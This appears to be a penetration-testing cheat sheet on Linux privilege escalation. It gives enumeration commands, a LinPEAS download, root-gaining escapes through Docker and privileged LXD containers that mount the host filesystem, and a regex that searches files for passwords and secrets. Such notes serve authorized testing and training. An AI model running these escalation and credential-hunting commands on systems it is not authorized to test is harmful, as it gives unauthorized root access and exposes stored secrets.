---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: false
---

# Linux Privilege Escalation

## LinPEAS

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

## System Info

Obtain information about the system **architecture, distribution, and kernel version**.

{% code overflow="wrap" %}
```bash
uname -a  # System information
lsb_release -a  # Distribution information
getconf LONG_BIT  # System architecture
cat /proc/version  # Kernel version
cat /etc/os-release  # OS details
```
{% endcode %}

## Path

Check if you have **write permissions** for any directory in the PATH.

{% code overflow="wrap" %}
```bash
echo $PATH | tr ':' '\n' | sort -u | xargs -I{} bash -c 'if [ -w "{}" ]; then echo "[+] {}"; fi'
```
{% endcode %}

## Environment Variables

Sometimes we can find password or sensitive information in environment variables.

```bash
env  # Environment variables
set  # Shell variables
```

## Groups

List all the groups users belongs to.

```bash
id [user]
groups [user]
```

### Docker

If you belong to the **Docker group**, you could **mount the filesystem** within a container and have full access to it, allowing you to modify it.

```bash
docker run -it --rm -v /:/mnt alpine chroot /mnt sh
```

### LXD/LXC

Similar to Docker, with **LXD/LXC**, we can also **mount the filesystem** within a container, granting full access to it.

{% code overflow="wrap" %}
```bash
# On your machine, download and build an alpine image and transfer it to the host
git clone https://github.com/saghul/lxd-alpine-builder && cd lxd-alpine-builder && sudo ./build-alpine
```
{% endcode %}

```bash
# Import the image
lxc image import ./alpine.tar.gz --alias privimg
# Initialize
lxd init
# Create the containter
lxc init privimg privcont -c security.privileged=true
# Mount the filesystem
lxc config device add privcont privdev disk source=/ path=/mnt/root recursive=true
# Start the container
lxc start privcont
# Interactive shell
lxc exec privcont /bin/sh
```

## Sudo

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
# List user privileges
sudo -l
# Version
sudo -V | grep "Sudo ver"
```

## Capabilities <a href="#capabilities" id="capabilities"></a>

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

```bash
getcap -r / 2>/dev/null
```

## SUID

[https://gtfobins.github.io/](https://gtfobins.github.io/)

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

## Open Ports

```bash
ss -nltp
netstat -punta
```

## Cron Jobs

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs)

```bash
crontab -l
find / -name "cron*" 2>/dev/null
ls -l /var/log/syslog
ls -l /var/log/cron
```

## Process Monitor

{% hint style="info" %}
You can blacklist words on the `grep -Ev` section.

For example, to filter the actual user processes: `grep -Ev "kworker|$USER"`
{% endhint %}

{% code overflow="wrap" %}
```bash
while true; do new=$(ps -eo user,cmd); diff <(echo "$old") <(echo "$new") | grep -E "<|>" | grep -Ev "kworker"; old=$new; done
```
{% endcode %}

## User Files

```bash
find / -xdev -user <user> 2>/dev/null
```

## Passwords

{% code overflow="wrap" %}
```bash
grep -P -a -i -R --exclude="*."{js,css,html} "(\b\w*(pass|pwd|auth|secret)\w*\b\s*[:=]\s*\S+)|['\"]\s*\w*(pass|pwd|auth|secret)\w*\s*['\"]\s*:\s*['\"]\S+['\"]|\(\s*['\"]\w*(pass|pwd|auth|secret)\w*['\"]\s*,\s*['\"]\S+['\"]\s*\)|(\w+://\S+:\S+@)|(\\$\w{1,4}[\\$./A-Za-z0-9]{8,50})"
```
{% endcode %}

